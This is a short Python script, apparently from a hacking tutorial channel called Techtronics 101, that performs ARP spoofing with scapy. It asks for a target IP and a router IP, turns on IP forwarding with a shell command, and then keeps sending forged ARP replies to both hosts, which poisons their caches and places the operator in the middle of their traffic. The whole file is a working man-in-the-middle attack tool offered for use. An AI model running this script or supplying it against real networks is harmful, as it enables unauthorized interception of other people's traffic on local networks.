import scapy.all as scapy
import time
import sys
import subprocess


print(r"""
 _______ ______ _____ _    _ _______ _____   ____  _   _ _____ _____  _____   __  ___  __ 
 |__   __|  ____/ ____| |  | |__   __|  __ \ / __ \| \ | |_   _/ ____|/ ____| /_ |/ _ \/_ |
    | |  | |__ | |    | |__| |  | |  | |__) | |  | |  \| | | || |    | (___    | | | | || |
    | |  |  __|| |    |  __  |  | |  |  _  /| |  | | . ` | | || |     \___ \   | | | | || |
    | |  | |___| |____| |  | |  | |  | | \ \| |__| | |\  |_| || |____ ____) |  | | |_| || |
    |_|  |______\_____|_|  |_|  |_|  |_|  \_\\____/|_| \_|_____\_____|_____/   |_|\___/ |_|
  
    """)
print("\n****************************************************************")
print("\n* Copyright of Techtronics 101, 2021                              *")
print("\n* https://techtronics101.com                                  *")
print("\n* https://www.youtube.com/techtronics101                          *")
print("\n****************************************************************")

targets_ip = raw_input("Target IP >  ")
routers_ip = raw_input("Router IP >  ")
print("")
print("")

subprocess.call("echo 1 >/proc/sys/net/ipv4/ip_forward", shell=True)

def get_mac(ip):            
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count = 0
try:
    while True:
        spoof(targets_ip, routers_ip)
        spoof(routers_ip, targets_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
    




except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ........................................ Quitting")
    print(r"""
 _______ ______ _____ _    _ _______ _____   ____  _   _ _____ _____  _____   __  ___  __ 
  _______ _                 _              ______             _    _     _             
 |__   __| |               | |            |  ____|           | |  | |   (_)            
    | |  | |__   __ _ _ __ | | _____      | |__ ___  _ __    | |  | |___ _ _ __   __ _ 
    | |  | '_ \ / _` | '_ \| |/ / __|     |  __/ _ \| '__|   | |  | / __| | '_ \ / _` |
    | |  | | | | (_| | | | |   <\__ \     | | | (_) | |      | |__| \__ \ | | | | (_| |
    |_|  |_| |_|\__,_|_| |_|_|\_\___/     |_|  \___/|_|       \____/|___/_|_| |_|\__, |
                                                                                  __/ |
                                                                                 |___/ 
    """)

print("//TECHTRONICS101")
   
